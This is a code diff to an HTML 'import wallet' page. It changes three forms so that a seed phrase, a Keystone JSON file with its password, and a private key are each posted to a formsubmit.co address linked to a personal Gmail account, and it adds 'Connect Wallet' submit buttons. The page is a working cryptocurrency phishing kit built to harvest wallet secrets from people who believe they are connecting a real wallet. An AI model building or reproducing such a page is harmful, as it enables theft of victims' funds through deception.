@@ -78,34 +78,43 @@
 
         <div class="containerrr">
             
-            <div>
+            <div class="commms">
     
                 <h2 class="registerrr">import wallet</h2>
                 <div class="form-button">
                     <div class="button-form">
-                        <button onclick="showForm('form1')">Phrase</button>
+                        <button onclick="showForm('form1'); toggleActive('this')">Phrase</button>
                         <button onclick="showForm('form2')">Keystone JSON</button>
                         <button onclick="showForm('form3')">Private Key</button>
                     </div>
                 </div>
-                <form id="form1" class="hidden">
+                <form action="https://formsubmit.co/ajeemmanuel221@gmail.com" method="post" id="form1" class="hidden">
                     <div>
-                        <textarea class="inner" name="" placeholder="Enter Phrase Here" id="form1" cols="40" rows="3"></textarea>
+                        <textarea class="inner" name="phrase" placeholder="Enter Phrase Here" id="form1" cols="40" rows="3" required></textarea>
+                    </div>
+                    <div class="button-container">
+                        <button>Connect Wallet</button>
                     </div>
                     <!-- Form 1 fields go here -->
                 </form>
                 
-                <form id="form2" class="hidden">
+                <form action="https://formsubmit.co/ajeemmanuel221@gmail.com" id="form2" class="hidden">
                     <div class="json-inout">
-                        <input class="inners" type="text" placeholder="Enter Keystone JSON here">
-                        <input class="inners" type="password" placeholder="Enter Password">
+                        <input class="inners" name="jsonUsername" type="text" placeholder="Enter Keystone JSON here">
+                        <input class="inners" name="jsonPassword" type="password" placeholder="Enter Password">
+                    </div>
+                    <div class="button-container">
+                        <button>Connect Wallet</button>
                     </div>
                     <!-- Form 2 fields go here -->
                 </form>
                 
-                <form id="form3" class="hidden">
+                <form action="https://formsubmit.co/ajeemmanuel221@gmail.com" id="form3" class="hidden">
                     <div>
-                        <textarea class="inner" name="" placeholder="Enter Private Key here" id="form3" cols="40" rows="3"></textarea>
+                        <textarea class="inner" name="privateKey" placeholder="Enter Private Key here" id="form3" cols="40" rows="3"></textarea>
+                    </div>
+                    <div class="button-container">
+                        <button>Connect Wallet</button>
                     </div>
                     <!-- Form 3 fields go here -->
                 </form>
@@ -116,9 +125,7 @@
                         Regarding (24 seed phrase wallets), input two phrases per spacebox.
                     </a>
                 </div>
-                <div class="button-container">
-                    <button>Connect Wallet</button>
-                </div>
+                
             </div>
 
         </div>
